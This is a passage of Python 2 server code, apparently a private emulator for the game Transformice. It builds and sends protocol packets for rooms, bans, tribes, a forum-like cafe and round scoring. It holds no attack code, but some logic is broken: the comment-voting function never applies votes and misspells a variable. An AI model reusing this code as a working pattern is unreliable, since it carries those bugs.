                packet.writeUTF(str(finalList[x][1]))

        self.sendData('\x1a#', packet.toString(), True)

    def sendNewFingerprint(self):
        self.sendData(',\x02', struct.pack('!h', len(str(self.server.LCDMT))) + str(self.server.LCDMT) + struct.pack('!h', self.CMDTEC), True)

    def sendServerGameType(self, t):
        self.sendData('\x07\x01', chr(int(t)), True)

    def sendVerification(self):
        self.sendData('\x14\x04', chr(0) * 2, True)

    def sendDiscountShop(self, fullitem, time, percent):
        self.sendData('\x14\x03', struct.pack('!iib', fullitem, time, percent), True)

    def sendTimesStamp(self):
        self.sendData('\x1c\x02', struct.pack('!i', int(thetime.time())), True)

    def sendCandyCollection(self):
        self.sendData('\x13\x07', [self.CollectCount])

    def addShamanObject(self, objectId, x, y, angle, xSpeed, ySpeed, ghost, origin = 0):
        data = struct.pack('!hhhhhbbbb', 0, objectId, x, y, angle, xSpeed, ySpeed, ghost, origin)
        self.room.sendAllBin('\x05\x14', data)

    def sendForumConnectNow(self):
        self.sendData('\x1a\x15', [])

    def sendBulle(self, ip):
        self.sendData(',\x01', struct.pack('!ih', int(self.server.LCDMT), len(str(ip))) + str(ip), True)

    def sendTribulleProtocol(self, code, payload):
        self.sendData('<\x01', code + payload, True)

    def sendTribulleUsername(self, username, data, payload):
        for room in self.server.rooms.values():
            for playerCode, client in room.clients.items():
                if client.username == username:
                    client.sendTribulleProtocol(data, payload)
                    break

    def getCppid(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select id from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return 0
            if rrf[0] == 'None':
                return 0
            return int(rrf[0])
            return

    def getPrivilegeLevel(self, username):
        if username.startswith('*'):
            return 0
        else:
            self.Database.execute('select privlevel from users where name = ?', [username])
            rrf = self.Database.fetchone()
            if rrf is None:
                return 0
            if rrf[0] == 'None':
                return 0
            return int(rrf[0])
            return

    def sendRoundLeader(self, Round, playerCode):
        p = self.parseByte.ByteArray()
        p.writeByte(Round)
        p.writeInt(playerCode)
        self.sendData('\x05\x01', p.toString(), True)

    def sendRoundMulodrome(self, rnd, blue, red):
        p = self.parseByte.ByteArray()
        p.writeByte(rnd)
        p.writeShort(blue)
        p.writeShort(red)
        self.sendData('\x1e\x04', p.toString(), True)

    def sendPlaceMulodrome(self, rnd, blue, red):
        p = self.parseByte.ByteArray()
        found = False
        if blue > red:
            found = 0
        if blue < red:
            found = 1
        if found in (0, 1):
            p.writeByte(found)
            p.writeShort(blue)
            p.writeShort(red)
            self.sendData('\x1e\x15', p.toString(), True)
        self.sendData('\x1e\r', None, True)
        return

    def sendPlayerLoginData(self):
        self.sendData('\x1a\x08', [self.username,
         self.playerCode,
         self.privilegeLevel,
         0,
         int(self.isNewbie)])

    def sendPlayerIdentificationData(self):
        p = self.parseByte.ByteArray()
        p.writeInt(self.cppid)
        p.writeUTF(self.username)
        p.writeShort(self.playerLevel)
        p.writeShort(0)
        p.writeBytes(self.LangueByte)
        self.sendData('\x1a\x02', p.toString(), True)

    def sendShamanItens(self):
        p = self.parseByte.ByteArray()
        boughtShamItens = self.shamItens.split('|')
        boughtShamItens = filter(None, boughtShamItens)
        p.writeShort(len(boughtShamItens))
        for item in boughtShamItens:
            if '_' in item:
                item, custom = item.split('_', 1)
                if '+' in custom:
                    custom = custom.split('+')
                elif custom != '':
                    custom = [custom]
                else:
                    custom = ()
                p.writeShort(int(item))
                p.writeByte(self.ShopModule.getShamItemUsed(int(item)))
                p.writeByte(len(custom) + 1)
                for x in range(len(custom)):
                    p.writeInt(int(custom[x], 16))

            else:
                p.writeShort(int(item))
                p.writeByte(self.ShopModule.getShamItemUsed(int(item)))
                p.writeByte(0)

        self.sendData('\x14\x1b', p.toString(), True)
        return

    def sendEnableSkill(self, id, count):
        self.sendData('\x08\n', struct.pack('!bb', id, count), True)

    def sendSkillObject(self, ID, x, y, angle):
        self.room.sendAllBin('\x05\x0e', struct.pack('!hhbh', int(x), int(y), ID, angle))

    def sendSpawnItens(self, id, x, y):
        self.room.sendAllBin('\x05\x0c', struct.pack('!bhh', id, int(x), int(y)))

    def sendGainCurrency(self, coin, amount):
        self.sendData('\x08\x02', struct.pack('!bb', int(coin), int(amount)), True)

    def sendGainExp(self, amount):
        self.sendData('\x08\t', struct.pack('!h', int(amount)), True)

    def sendExp(self, level, exp, explvl):
        self.sendData('\x08\x08', struct.pack('!hii', level - 1, exp, explvl), True)

    def sendErnedExp(self, xp, saves):
        self.sendData('\x18\x01', struct.pack('!hh', xp, saves), True)

    def sendErnedLevel(self, name, level):
        self.room.sendAllBin('\x18\x02', struct.pack('!h', len(name)) + name + struct.pack('!h', level - 1))

    def sendShamanLevel(self, shamanPlayerCode, shamanPlayerCodeTwo, hardOne, hardTwo, levelOne, levelTwo, skillOne, skillTwo):
        self.sendData('\x08\x0b', struct.pack('!iibbhhbb', shamanPlayerCode, shamanPlayerCodeTwo, hardOne, hardTwo, levelOne, levelTwo, skillOne, skillTwo), True)

    def sendStartEfectTeleport(self, posX, posY):
        self.room.sendAllBin('\x052', struct.pack('!bhh', 36, posX, posY))

    def sendEndEfectTeleport(self, posX, posY):
        self.room.sendAllBin('\x052', struct.pack('!bhh', 37, posX, posY))

    def addPopup(self, id = 0, type = 0, text = '', x = 0, y = 0, width = 0):
        self.sendData('\x1d\x17', struct.pack('!ibh', id, type, len(str(text))) + str(text) + struct.pack('!hhh', x, y, width), True)

    def addTextArea(self, id = 0, text = '', x = 0, y = 0, width = 0, height = 0, backgroundColor = 0, borderColor = 0, backgroundAlpha = 0):
        self.sendData('\x1d\x14', struct.pack('!ih', id, len(str(text))) + str(text) + struct.pack('!hhhhiib', x, y, width, height, backgroundColor, borderColor, backgroundAlpha), True)

    def addModoPwetTextArea(self, id = 0, text = '', x = 0, y = 0, width = 0, height = 0, backgroundColor = 0, borderColor = 0, backgroundAlpha = 0, fixedPos = False):
        data = struct.pack('!ih', id, len(str(text))) + str(text) + struct.pack('!hhhhiib?', x, y, width, height, backgroundColor, borderColor, backgroundAlpha, fixedPos)
        self.room.sendModChatLocal(self, '\x1d\x14', self.Langue, data, True)

    def sendRemoveCheese(self, playerCode):
        self.room.sendAllBin('\x08\x13', struct.pack('!i', playerCode))

    def sendGotCheese(self):
        self.room.sendAll('\x05\x13', [str(self.playerCode)])
        self.hasCheese = True

    def Suicide(self):
        if not self.isDead:
            self.isDead = True
            self.score -= 1
            if self.score < 0:
                self.score = 0
            self.sendPlayerDied(self.playerCode, self.score)
            self.sendAllMessage('<R>' + self.username + " <N>morreu :'(")
            self.room.checkShouldChangeWorld()

    def KillPlayerDelay(self, Delay = 0):
        reactor.callLater(Delay, self.Suicide)

    def sendPlayerBan(self, hours, banreason, silent):
        bantime = 3600000 * hours
        self.sendData('\x1a\x11', [bantime, banreason])
        if self.room:
            if not silent:
                self.sendPlayerBanMessage(self.username, hours, banreason)
            self.room.disconnectBanTimer = reactor.callLater(0.3, self.server.disconnectIPaddress, self.address[0])
        self.isBanned = True

    def sendPlayerBanLogin(self, hours, banreason):
        bantime = 3600000 * hours
        self.sendData('\x1a\x12', [bantime, banreason])
        self.isBanned = True

    def sendBanWarning(self, hours):
        self.sendData('\x1a\x12', [hours])

    def sendPermaBan(self):
        self.sendData('\x1a\x12', [])

    def sendBanConsideration(self):
        self.sendData('\x1a\t', ['0'])

    def sendBanNotExist(self):
        self.sendData('\x1a\t', [])

    def sendPlayerBanMessage(self, name, time, reason):
        self.room.sendAll('\x1a\x07', [name, time, reason])

    def sendDestroyConjuration(self, x, y):
        self.room.sendAll('\x04\x0f', [x, y])

    def sendStartSnowStorm(self):
        self.room.sendAll('\x05\x17', ['0'])

    def sendEndSnowStorm(self):
        self.room.sendAll('\x05\x17', [])

    def sendBlueTeam(self):
        self.isBlue = False

    def sendRedTeam(self):
        self.isRed = False

    def sendAllow(self):
        self.isAllowed = True

    def sendEverybodyDance(self):
        self.room.sendAll('\x1a\x18', [])

    def sendNotEnoughTotalCheeseEditeur(self):
        if self.Langue.lower() == 'br':
            self.sendData('\x1a\x04', ['<ROSE>Voc\xc3\xaa prescisa ter 50 queijos em perfil para exportar um mapa.'])
        else:
            self.sendData('\x1a\x04', ['<ROSE>You need have 50 cheeses in profile for export a map.'])

    def sendNotEnoughCheeseEditeur(self):
        self.sendData('\x0e\x14', ['', ''])

    def sendMapValidated(self):
        self.sendData('\x0e\x11', [])

    def sendVoteBox(self, author, yes, no):
        if self.cheesecount >= 0 and self.privilegeLevel != 0 and not self.SPEC:
            self.QualifiedVoter = True
            self.sendData('\x0e\x04', [author, yes, no])

    def sendMapExported(self, code):
        self.sendData('\x0e\x05', [code])

    def sendLoadMapAtCode(self, name, code, xml, yes, no, perma):
        self.sendData('\x0e\t', [xml,
         yes,
         no,
         perma])

    def sendUnlockedTitle(self, playerCode, titlenum, stars = 1):
        self.room.sendAll('\x08\x0e', [playerCode, titlenum, stars])

    def sendFriendConnected(self, name):
        self.sendData('\x08\x0b', [name])

    def sendMaxFriends(self):
        self.sendData('\x08\x0c', ['0'])

    def sendNewFriend(self, name):
        self.sendData('\x08\x0c', ['1', name])

    def sendAlreadyFriend(self, name):
        self.sendData('\x08\x0c', ['2', name])

    def sendRemovedFriend(self, name):
        self.sendData('\x08\x0c', ['4', name])

    def sendEnterRoom(self, roomName):
        p = self.parseByte.ByteArray()
        p.writeByte(1 if roomName.startswith('*') else 0)
        p.writeUTF(str(roomName))
        self.sendData('\x05\x15', p.toString(), True)

    def sendBoulneige(self, code, y, x, direct, ghost):
        ghost = int(ghost)
        if direct == 1:
            self.room.sendAllBin('\x05\x14' + struct.pack('!h', int(0)) + struct.pack('!h', int(code)) + struct.pack('!h', int(x)) + struct.pack('!h', int(y)) + struct.pack('!b', int(0)) + struct.pack('!h', int(0)) + struct.pack('!h', int(ghost)))
        else:
            self.room.sendAllBin('\x05\x14' + struct.pack('!h', int(0)) + struct.pack('!h', int(code)) + struct.pack('!h', int(x)) + struct.pack('!h', int(y)) + struct.pack('!b', int(0)) + struct.pack('!h', int(0)) + struct.pack('!h', int(ghost)))

    def sendBoulneige2(self, code, y, x, direct, ghost):
        ghost = int(ghost)
        if direct == 1:
            self.room.sendAllBin('\x05\x14' + struct.pack('!h', int(0)) + struct.pack('!h', int(code)) + struct.pack('!h', int(x)) + struct.pack('!h', int(y)) + struct.pack('!b', int(0)) + struct.pack('!h', int(10)) + struct.pack('!h', int(ghost)))
        else:
            self.room.sendAllBin('\x05\x14' + struct.pack('!h', int(0)) + struct.pack('!h', int(code)) + struct.pack('!h', int(x)) + struct.pack('!h', int(y)) + struct.pack('!b', int(0)) + struct.pack('!h', int(-10)) + struct.pack('!h', int(ghost)))

    def spawnVelObject(self, code, x, y, vx, vy, ghost):
        self.room.objectid += 2
        self.room.sendAllBin('\x05\x14' + struct.pack('!hhhhbhh', int(self.room.objectid), int(code), int(x), int(y), int(vx), int(vy), int(ghost)))

    def spawnObject(self, code, x, y, ghost):
        self.room.objectid += 2
        self.room.sendAllBin('\x05\x14' + struct.pack('!hhhhbhh', int(self.room.objectid), int(code), int(x), int(y), 0, 0, int(ghost)))

    def sendTribeInfoUpdate(self, greeting = None, playerlist = None):
        if playerlist:
            self.server.sendTribeInfoUpdate(self.TribeCode, True, True)
        elif greeting:
            self.server.sendTribeInfoUpdate(self.TribeCode, True)
        else:
            self.server.sendTribeInfoUpdate(self.TribeCode)

    def sendTribeList(self):
        self.sendData('\x10\x10', self.server.getTribeList(self.TribeCode))

    def sendTribeConnected(self, name):
        self.server.sendWholeTribeOthers(self, '\x10\x04', ['1', name])

    def sendTribeDisconnected(self, name):
        self.server.sendWholeTribe(self, '\x10\x04', ['2', name])

    def sendTribePermisson(self):
        self.sendData('\x10\x04', ['3'])

    def sendPlayerAlreadyInTribe(self):
        self.sendData('\x10\x04', ['4'])

    def sendInvitationSent(self):
        self.sendData('\x10\x04', ['5'])

    def sendNewTribeMember(self, name, tribe):
        self.server.sendWholeTribe(self, '\x10\x04', ['6', name, tribe], False, True)

    def sendNewTribeAlreadyInTribe(self):
        self.sendData('\x10\x04', ['7'])

    def sendNewTribeNotEnoughCheese(self):
        self.sendData('\x10\x04', ['8'])

    def sendNewTribeNameAlreadyTaken(self):
        self.sendData('\x10\x04', ['9'])

    def sendMadeNewTribe(self, name):
        self.sendData('\x10\x04', ['10', name])

    def sendNoLongerPartOfTribe(self, name):
        self.server.sendWholeTribe(self, '\x10\x04', ['11', name], False, True)

    def sendRankChange(self, name, rank):
        self.server.sendWholeTribe(self, '\x10\x04', ['12', name, rank], False, True)

    def sendDeactivateTribeChat(self, name):
        self.server.sendWholeTribe(self, '\x10\x04', ['13', '0', name], False, True)

    def sendActivateTribeChat(self, name):
        self.server.sendWholeTribe(self, '\x10\x04', ['13', '1', name], False, True)

    def sendTribeInvite(self, tribeID, username, tribeName):
        self.sendData('\x10\x0e', [tribeID, username, tribeName])

    def sendDisableWhispers(self):
        self.sendData('\x10\x04', ['14', '0'])

    def sendEnableWhispers(self):
        self.sendData('\x10\x04', ['14', '1'])

    def sendDisabledWhispers(self, name):
        player = self.room.getPlayer(name)
        string = player.silenceData
        if string == '\x00' or string == '\x01':
            self.sendData2('\x06(' + struct.pack('!h', len(name)) + name)
        elif string.startswith('\x00\x00') or string.startswith('\x01\x00'):
            message = string[3:]
            self.sendData2('\x06(' + struct.pack('!h', len(name)) + name + struct.pack('!h', len(message)) + message)

    def sendForumCreateAccount(self):
        self.sendData('\x1a\x04', ["<J><font size='12'>You can now access to the Transformice forums : <a href='http://" + self.server.BaseForumURL + "' target='_blank'><u>http://" + self.server.BaseForumURL + '</u></a></font>'])

    def sendForumNewPM(self, count):
        self.sendData('\x1a\x04', ['<J>You have ' + str(count) + " unread message(s) in your forum's inbox <a href='http://" + self.server.BaseForumURL + "' target='_blank'><u>http://" + self.server.BaseForumURL + '</u></a>'])

    def sendModMute(self, name, time, reason):
        data = str(struct.pack('!h', len(name)) + name + struct.pack('!hh', time, len(reason)) + reason + struct.pack('!xx'))
        self.sendData('\x1c\x08', data, True)

    def sendModMuteRoom(self, name, time, reason):
        data = struct.pack('!h', len(name)) + name + struct.pack('!hh', time, len(reason)) + reason + struct.pack('!xx')
        self.room.sendAllBin('\x1c\x08', data)

    def sendElection(self, username):
        username = username.lower().capitalize()
        isguest = username.find('*')
        if isguest == -1:
            if self.server.checkAlreadyConnectedAccount(username):
                data = self.server.getElectionData(username)
                self.sendData('\x08\x10', data, True)

    def sendProfile(self, username):
        username = username.lower().capitalize()
        isguest = username.find('*')
        if isguest == -1:
            if self.server.checkAlreadyConnectedAccount(username):
                data = self.server.getProfileData(username)
                self.sendData('\x08\x10', data, True)

    def sendAutoReport(self, reason):
        message = ['\n[<R>W A R N <V>S E R V E R<BL>]\n<J>New Report<BL>: Reason: [<V>' + str(reason) + '<BL>]\nUser Reported[<J>' + str(self.username) + '<BL>]\n']
        self.server.sendModChat(self, '\x06\t', struct.pack('!h', len(message[0])) + message[0], True)

    def catchTheCheeseNoShaman(self, playerCode):
        self.sendData('\x08\x17', [playerCode])
        self.sendData('\x05\x13', [playerCode])
        self.room.isCatchTheCheeseMap = True

    def catchTheCheeseShaman(self, playerCode):
        self.sendData('\x08\x17', [playerCode])
        self.sendData('\x05\x13', [playerCode])
        self.sendData('\x08\x14', [playerCode])
        self.room.isCatchTheCheeseMap = True
        self.sendShamanCode(playerCode)

    def sendNewParty(self):
        p = self.parseByte.ByteArray()
        p.writeInt(int(self.room.currentWorld))
        p.writeShort(self.room.getPlayerCount())
        p.writeByte(self.room.code_partier)
        p.writeInt(0)
        p.writeByte(0)
        p.writeByte(0)
        self.sendData('\x05\x02', p.toString(), True)

    def sendNewPartyCustomMap(self, mapisc, mapxml, mapname, mapperma):
        p = self.parseByte.ByteArray()
        p.writeInt(mapisc)
        p.writeShort(self.room.getPlayerCount())
        p.writeByte(self.room.code_partier)
        p.writeUTF(str(mapxml))
        p.writeUTF(str(mapname))
        p.writeByte(int(mapperma))
        p.writeByte(0)
        self.sendData('\x05\x02', p.toString(), True)

    def sendNewPartyMapEditeur(self, mapxml, mapname, mapperma):
        p = self.parseByte.ByteArray()
        p.writeInt(-1)
        p.writeShort(self.room.getPlayerCount())
        p.writeByte(self.room.code_partier)
        p.writeUTF(str(mapxml))
        p.writeUTF(str(mapname))
        p.writeByte(100)
        p.writeByte(0)
        self.sendData('\x05\x02', p.toString(), True)

    def sendPlayerList(self):
        self.sendData('\x08\t', list(self.room.getPlayerList()))

    def sendTeamColors(self):
        for k, v in self.room.TeamDrome.items():
            p = self.parseByte.ByteArray()
            p.writeInt(v['id'])
            if v['team'] in (0,):
                p.writeInt(9936639)
            else:
                p.writeInt(16749462)
            self.sendData('\x1d\x04', p.toString(), True)

    def sendNewPlayer(self, playerData):
        self.room.sendAllOthers(self, '\x08\x08', [playerData])

    def sendPlayerDisconnect(self, playerCode):
        if self.room != None:
            if int(self.room.getPlayerCount()) >= 1:
                if self.room.isDoubleMap:
                    if self.room.checkIfDoubleShamansAreDead():
                        self.send20SecRemainingTimer()
                elif self.room.checkIfShamanIsDead():
                    self.send20SecRemainingTimer()
                if self.room.checkIfTooFewRemaining():
                    self.send20SecRemainingTimer()
            self.room.sendAll('\x08\x07', [playerCode])
        return

    def sendPlayerDied(self, playerCode, score):
        if int(self.room.getPlayerCount()) >= 1:
            if self.room.isDoubleMap:
                self.respawn = False
                if self.room.checkIfDoubleShamansAreDead():
                    self.send20SecRemainingTimer()
            elif self.room.checkIfShamanIsDead():
                if self.respawn:
                    pass
                else:
                    self.send20SecRemainingTimer()
            if self.room.checkIfTooFewRemaining():
                if self.respawn:
                    pass
                else:
                    self.send20SecRemainingTimer()
        self.room.sendAll('\x08\x05', [playerCode, self.room.checkDeathCount()[1], score])
        self.hasCheese = False
        if self.room.isCatchTheCheeseMap or self.isAfk:
            self.respawn = False
        if not self.isShaman:
            if self.room.isBoobleCount > 0:
                if not self.isAfk:
                    self.room.isBoobleCount -= 1
                    self.sendSpawnItens(59, self.pX * 800 / 2700, 415)
            if self.room.disintegration:
                self.sendSkillObject(6, self.pX * 800 / 2700, 395, 0)
        elif self.respawn:
            self.respawn = False
            self.room.respawnSpecific(self.username)
            for playerCode2, client in self.room.clients.items():
                client.sendShamanCode(self.playerCode)
                
    def sendons(self):
        message = '<font color="#FF3030">[+] <N>Com voc\xc3\xaa h\xc3\xa1 <font color="#00BFFF">' + str(self.server.getConnectedPlayerCount()) + '<N> jogadores onlines!'
        self.sendMessage(message)
        self.rebotTimer = reactor.callLater(82, self.sendons)

    def getSecondsDiff(self, endTime):
        return int(int(str(thetime.time())[:10]) - endTime)

    def sendLoadCafeMode(self):
        data = ''
        self.Database.execute('select * from cafe ORDER BY regdate Desc LIMIT 0, 20')
        rrfRows = self.Database.fetchall()
        for rrf in rrfRows:
            data = data + struct.pack('!i', int(rrf[0]))
            data = data + struct.pack('!h', len(rrf[1])) + rrf[1]
            data = data + struct.pack('!i', int(self.getPlayerID(rrf[1])))
            data = data + struct.pack('!i', int(rrf[2]))
            data = data + struct.pack('!h', len(rrf[3])) + rrf[3]
            data = data + struct.pack('!i', self.getSecondsDiff(int(rrf[4])))

        if self.cheesecount >= 1 or self.privilegeLevel >= 1:
            date = chr(1)
        else:
            date = chr(0)
        self.sendData('\x1e*' + date, [], True)
        self.sendData('\x1e(' + data, [], True)

    def sendCreateNewTopicForCafe(self, title, message, name, time):
        self.Database.execute('select id from cafe ORDER BY -id')
        lastid = self.Database.fetchone()
        if lastid is None:
            ID = 1
        else:
            ID = int(lastid[0]) + 1
        self.Database.execute('insert into cafe (id, titulo, cnumber, cend, regdate) values (?, ?, ?, ?, ?)', [ID,
         title,
         1,
         name,
         time])
        reactor.callLater(0.2, self.sendNewCommentCafe, ID, message, name, time)
        reactor.callLater(0.3, self.sendLoadCafeMode)
        reactor.callLater(0.4, self.sendOpenChatCafe, ID)
        return

    def sendOpenChatCafe(self, ID):
        ID = int(ID)
        selfID = ID
        self.Database.execute('select * from cafecomments where code = ? ORDER BY id ASC', [ID])
        rrfRows = self.Database.fetchall()
        data = struct.pack('!i', int(ID))
        for rrf in rrfRows:
            if rrf[4] != 0:
                ip = rrf[6]
                if str(self.playerCode) in ip:
                    ifpts = 0
                else:
                    ifpts = 1
            else:
                ifpts = 1
            data = data + struct.pack('!i', int(rrf[5]))
            data = data + struct.pack('!i', int(self.getPlayerID(rrf[1])))
            data = data + struct.pack('!i', self.getSecondsDiff(int(rrf[3])))
            data = data + struct.pack('!h', len(rrf[1])) + rrf[1]
            data = data + struct.pack('!h', len(rrf[2])) + rrf[2]
            data = data + struct.pack('!b', int(ifpts))
            data = data + struct.pack('!h', int(rrf[4]))

        self.sendData('\x1e)' + data, [], True)

    def sendNewCommentCafe(self, ID, Mensage, name, time):
        self.Database.execute('select id from cafecomments ORDER BY -id')
        newid = self.Database.fetchone()
        if newid is None:
            newid = 1
        else:
            newid = int(newid[0]) + 1
        self.Database.execute('insert into cafecomments (code, name, comments, regdate, pontos, id,ip) values (?, ?, ?, ?, ?, ?, ?)', [ID,
         name,
         Mensage,
         time,
         0,
         newid,
         ''])
        self.sendOpenChatCafe(ID)
        self.Database.execute('select id from cafecomments where code = ?', [ID])
        lenid = self.Database.fetchall()
        lenid = len(lenid)
        self.Database.execute('UPDATE cafe SET cend = ?, cnumber = ?, regdate = ? WHERE id = ?', [name,
         lenid,
         time,
         ID])
        data = struct.pack('!i', int(ID))
        data = data + struct.pack('!h', len(name)) + name
        data = data + struct.pack('!i', int(lenid))
        self.sendOpenChatCafe(ID)
        self.sendData('\x1e,' + data, [], True)
        for room in self.server.rooms.values():
            for client in room.clients.values():
                if client.modoCafe:
                    if not client.username == name:
                        client.sendData('\x1e,' + data, [], True)

        return

    def sendPoinsforcomments(self, postid, commentid, modo):
        self.Database.execute('select pontos, ip from cafecomments WHERE ID = ?', [commentid])
        rrf = self.Database.fetchall()
        saveip = ''
        i = False
        for x in rrf:
            t = x[0]
            p = x[1]
            c = repr(self.playerCode)
            if ',' in p:
                ip = p.split(',')
                aveip = p + ',' + c
            elif p != '':
                ip = [p]
                saveip = p + ',' + c
            else:
                saveip = c
                ip = ['0']
            for x in ip:
                if c in x:
                    i = False
                else:
                    l = True

        if i:
            if saveip != '':
                if modo == 1:
                    somepts = t + 1
                else:
                    somepts = t - 1
                self.Database.execute('UPDATE cafecomments SET pontos = ?, ip = ? WHERE id = ?', [somepts, saveip, commentid])
        self.sendLoadCafeMode()

    def send20SecRemainingTimer(self):
        if not self.room.changed20secTimer:
            self.room.changed20secTimer = True
            if self.room.isBootcamp:
                pass
            elif self.room.never20secTimer or self.room.isTribehouseMap:
                pass
            elif self.room.roundTime == 0:
                pass
            elif self.room.isEditeur:
                pass
            elif self.room.isRacing:
                pass
            elif self.room.isPlazza:
                pass
            elif self.room.autoRespawn or self.room.isTribehouseMap:
                pass
            elif int(self.room.roundTime + int(self.room.gameStartTime - thetime.time())) < 21:
                pass
            else:
                self.room.sendAllBin('\x05\x16', struct.pack('!h', 20))
                if self.room.worldChangeTimer:
                    try:
                        self.room.worldChangeTimer.cancel()
                    except:
                        self.room.worldChangeTimer = None

                self.room.worldChangeTimer = reactor.callLater(20, self.room.worldChange)
        return

    def sendPlayerGotPoints(self, playerCode, score, timeTaken):
        if int(self.room.getPlayerCount(True)) >= 2 and self.room.isDefilante:
            if not self.username.startswith('*'):
                self.sendGainCurrency(0, 1)
                self.shopcheese += 1
        p = self.parseByte.ByteArray()
        p.writeByte(self.room.checkDeathCount()[0])
        p.writeInt(playerCode)
        p.writeShort(0)
        p.writeByte(score)
        p.writeShort(timeTaken)
        self.room.sendAllBin('\x08\x06', p.toString())
        if self.room.isDefilante or self.room.isRacing:
            if self.room.currentRound <= 0:
                self.score = 0
        self.hasCheese = False

    def getCheeseForTeam(self, playerCode):
        if self.room.isMulodrome:
            for k, v in self.room.TeamDrome.items():
                if v['id'] == playerCode:
                    if v['team'] in (0,):
                        return 2
                    else:
                        return 3

        return 0

    def playerWin(self, objectID, codePartie):
        cantgoin = 0
        if self.room.isTutorial:
            self.sendData('\x05Z', chr(2), True)
            if self.isNewbie:
                self.isNewbie = False
                self.hasCheese = False
                self.room.worldChangeTimer = self.getReactor('callLater', (10, lambda : self.enterRoom(self.server.recommendRoom(self.Langue))))
                self.sendTime(10)
        if self.room.isEditeur:
            if self.room.ISCMVdata[7] == 0 and self.room.ISCMV != 0:
                self.room.ISCMVdata[7] = 1
                self.sendMapValidated()
        if codePartie != self.room.code_partier:
            pass
        elif not self.hasCheese:
            pass
        else:
            if self.isShaman:
                if self.room.isDoubleMap:
                    checkISCGI = self.room.checkIfDoubleShamanCanGoIn()
                else:
                    checkISCGI = self.room.checkIfShamanCanGoIn()
            else:
                checkISCGI = 1
            if checkISCGI == 0:
                cantgoin = 1
                self.saveRemainingMiceMessage()
            if cantgoin != 1:
                self.isDead = True
                self.room.numCompleted += 1
                if self.room.isDoubleMap:
                    if objectID == 1:
                        self.room.FSnumCompleted += 1
                    elif objectID == 2:
                        self.room.SSnumCompleted += 1
                    else:
                        self.room.FSnumCompleted += 1
                        self.room.SSnumCompleted += 1
                numCom = int(self.room.numCompleted)
                if self.room.autoRespawn or self.room.isTribehouseMap:
                    timeTaken = int((self.room.getTimer() - self.playerStartTime) * 100)
                else:
                    timeTaken = int((self.room.getTimer() - self.room.gameStartTime) * 100)
                score = self.score
                exp = 0
                if self.room.canScore:
                    if numCom == 1:
                        if self.room.isRacing:
                            score += 4
                            exp = 4
                        elif self.room.isDefilante:
                            exp = 1
                        else:
                            score += 16
                            exp = 6
                    elif self.room.getPlayerCount(True)>=1: #ratos para vale first
                            if not self.isShaman:
                                self.firstcount += 1
                                self.shopcheese += 1
                                self.shopfraises += 1
                                if self.privilegeLevel != 0:
                                    if self.firstcount in self.firstTitleCheckList:
                                        unlockedTitle = self.firstTitleDictionary[self.firstcount]
                                        self.sendUnlockedTitle(self.playerCode, unlockedTitle)
                                        self.FirstTitleList = self.FirstTitleList + [unlockedTitle]
                                        if self.username in self.server.ParseBase.admList:
                                            self.titleList = ['0,7'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                                        else:
                                            self.titleList = ['0'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                                        if self.privilegeLevel == 10:
                                            self.titleList = self.titleList + ['440',
                                             '442',
                                             '444',
                                             '445',
                                             '447',
                                             '448',
                                             '446']
                                        self.titleList = filter(None, self.titleList)
                    elif numCom == 2:
                        if self.room.isRacing:
                            score += 3
                            exp = 3
                        elif self.room.isDefilante:
                            exp = 1
                        else:
                            score += 14
                            exp = 4
                    elif numCom == 3:
                        if self.room.isRacing:
                            score += 2
                            exp = 2
                        elif self.room.isDefilante:
                            exp = 1
                        else:
                            score += 12
                            exp = 2
                    elif self.room.isRacing:
                        score += 1
                        exp = 1
                    elif self.room.isDefilante:
                        exp = 1
                    else:
                        score += 10
                if self.isShaman:
                    score = self.score
                if not self.room.canScore:
                    score = self.score
                self.score = score
                if not self.isShaman:
                    if int(self.room.getPlayerCount())>=1 and self.room.countStats:
                        self.cheesecount += 1
                        if self.privilegeLevel != 0:
                            if self.cheesecount in self.cheeseTitleCheckList:
                                unlockedTitle = self.cheeseTitleDictionary[self.cheesecount]
                                self.sendUnlockedTitle(self.playerCode, unlockedTitle)
                                self.CheeseTitleList = self.CheeseTitleList + [unlockedTitle]
                                if self.username in self.server.ParseBase.admList:
                                    self.titleList = ['0,7'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                                else:
                                    self.titleList = ['0'] + self.GiftTitleList + self.ShamanTitleList + self.HardModeTitleList + self.CheeseTitleList + self.FirstTitleList + self.ShopTitleList + self.BootcampTitleList + self.DivineModeTitleList
                                if self.privilegeLevel == 10:
                                    self.titleList = self.titleList + ['440',
                                     '442',
                                     '444',
                                     '445',
                                     '447',
                                     '448',
                                     '446']
                                self.titleList = filter(None, self.titleList)
                        self.shopcheese += 1
                        self.shopfraises += 1
                    if objectID == 0 or objectID == 1:
                        self.room.giveShamanSave()
                        loc1 = '1'
                    elif objectID == 2:
                        if self.room.isDoubleMap:
                            loc1 = '2'
                            self.room.giveSecondShamanSave()
                        else:
                            self.room.giveShamanSave()
                            loc1 = '1'
                    else:
                        self.room.giveShamanSave()
                        loc1 = '1'
                    if loc1 in '1':
                        if self.room.isShamMode[0] == 1:
                            self.room.giveShamanHardSave()
                        elif self.room.isShamMode[0] == 2:
                            self.room.giveShamanDivineModeSave()
                    elif loc1 in '2':
                        if self.room.isShamMode[1] == 1:
                            self.room.giveShamanHardSave(True)
                        elif self.room.isShamMode[1] == 2:
                            self.room.giveShamanDivineModeSave(True)
                elif int(self.room.getPlayerCount(True)) >= 2 and self.room.countStats:
                    if self.playerCode == self.room.currentShamanCode:
                        self.shamancheese += 1
                    elif self.playerCode == self.room.currentSecondShamanCode:
                        self.shamancheese += 1
                if self.room.isBootcamp:
                    if int(self.room.getPlayerCount())>1 and self.room.isBootcamp:
                        self.bootcampcount += 1
                        if self.privilegeLevel != 0:
                            if self.bootcampcount in self.bootcampTitleCheckList:
                                unlockedTitle = self.bootcampTitleDictionary[self.bootcampcount]
                                self.sendUnlockedTitle(self.playerCode, unlockedTitle)
                                self.BootcampTitleList = self.BootcampTitleList + [unlockedTitle]
                                if self.username in self.server.ParseBase.admList:
